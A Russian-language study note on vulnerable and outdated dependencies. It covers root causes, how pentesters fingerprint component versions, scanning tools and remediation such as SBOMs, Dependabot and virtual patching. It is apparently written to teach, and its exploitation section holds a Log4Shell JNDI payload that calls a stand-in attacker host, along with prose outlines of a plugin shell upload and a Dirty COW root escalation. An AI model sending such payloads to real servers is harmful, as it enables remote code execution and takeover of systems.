Эта категория посвящена рискам, связанным не с твоим собственным кодом, а с «кирпичиками», из которых ты строишь приложение: библиотеками, фреймворками, модулями и системными пакетами. В современном мире разработчики пишут лишь 10-20% кода, остальное — это зависимости.

---

### **1. Общее описание**

Уязвимость возникает, когда вы используете компонент, в котором обнаружена брешь в безопасности (CVE), но вы его не обновили. Поскольку эти компоненты часто работают с теми же правами, что и само приложение, их взлом ведет к полной компрометации системы.

**Основные сценарии:**

- **Прямые зависимости:** Ты используешь библиотеку (например, `log4j` или `express`), в которой нашли критический баг.
    
- **Транзитивные зависимости:** Ты используешь библиотеку А, которая внутри использует библиотеку Б, и именно в Б есть дыра.
    
- **Устаревшее ПО:** Веб-сервер (Nginx), база данных (PostgreSQL) или сама ОС (Ubuntu 16.04) больше не получают обновлений безопасности.
    

---

### **2. Почему это возникает? (Корневые причины)**

- **"Работает — не трогай":** Страх, что обновление библиотеки сломает основной функционал приложения (Breaking changes).
    
- **Отсутствие инвентаризации:** Разработчики часто даже не знают полный список используемых ими сторонних модулей (особенно вложенных).
    
- **Сложность мониторинга:** Каждый день выходят десятки исправлений для тысяч библиотек, и отслеживать их вручную невозможно.
    

---

### **3. Методология поиска (Как искать пентестеру)**

- **Fingerprinting (Снятие отпечатков):**
    
    - Проверка заголовков: `Server: Apache/2.4.41`.
        
    - Анализ специфических файлов: `CHANGELOG.txt`, `README.md`, `package.json`, которые могут быть доступны публично.
        
- **Анализ клиентских скриптов:**
    
    - Изучение исходного кода страницы (Ctrl+U) на наличие путей типа `/js/jquery-1.10.2.min.js`.
        
- **Сканирование репозиториев:**
    
    - Если есть доступ к коду, проверка манифестов: `go.mod`, `requirements.txt`, `pom.xml`.

### **4. Как эксплуатировать (Примеры)**

#### **Пример 1: Log4Shell (CVE-2021-44228)**

Библиотека логирования Java log4j позволяла исполнять произвольный код через простую строку в логах.

Эксплойт: Хакер отправляет запрос с заголовком: ${jndi:ldap://hacker.com/a}. Сервер записывает это в лог, библиотека обрабатывает строку и выполняет код хакера.

#### **Пример 2: Устаревший WordPress/CMS**

Многие плагины для CMS имеют известные дыры.

Эксплойт: Пентестер видит плагин Contact Form 7 старой версии. Находит на Exploit-DB готовый скрипт для заливки "шелл" (удаленного доступа) через этот плагин и получает контроль над сайтом.

#### **Пример 3: Уязвимость в ядре (Dirty COW)**

Если сервер работает на очень старом ядре Linux.

Эксплойт: Обычный пользователь (или хакер, получивший доступ с низкими правами) запускает эксплойт, который использует ошибку в управлении памятью и мгновенно становится пользователем root.

### **5. Инструменты для поиска**

|**Инструмент**|**Функция**|
|---|---|
|**Retire.js**|Сканирует JavaScript-библиотеки на наличие известных уязвимостей.|
|**Snyk / Dependency-Check**|Мощные сканеры, которые анализируют манифесты проекта (`go.mod`, `npm`) и ищут их в базе CVE.|
|**Trivy**|Лучший инструмент для сканирования Docker-образов на наличие уязвимых пакетов ОС.|
|**Wappalyzer**|Плагин для браузера, который показывает стек технологий сайта и их версии.|
|**Searchsploit**|Консольный поиск по базе Exploit-DB прямо из терминала Linux.|

### **6. Как исправить (Рекомендации разработчику)**

1. **SBOM (Software Bill of Materials):** Ведите полный список всех компонентов. Если завтра найдут баг в библиотеке `X`, вы должны за секунду найти все свои проекты, где она используется.
    
2. **Автоматические обновления:** Используйте инструменты типа **Dependabot** (GitHub), которые сами создают Pull Request при выходе новой версии библиотеки.
    
3. **Виртуальный патчинг:** Если обновиться прямо сейчас невозможно, используйте WAF (Web Application Firewall) для блокировки известных векторов атак на этот компонент.
    
4. **Удаление лишнего:** Если библиотека используется ради одной функции — возможно, проще написать эту функцию самому, чем тащить в проект огромный сторонний код.
    
5. **Контроль цепочки поставок:** Скачивайте зависимости только из доверенных репозиториев и проверяйте их контрольные суммы (hashes).
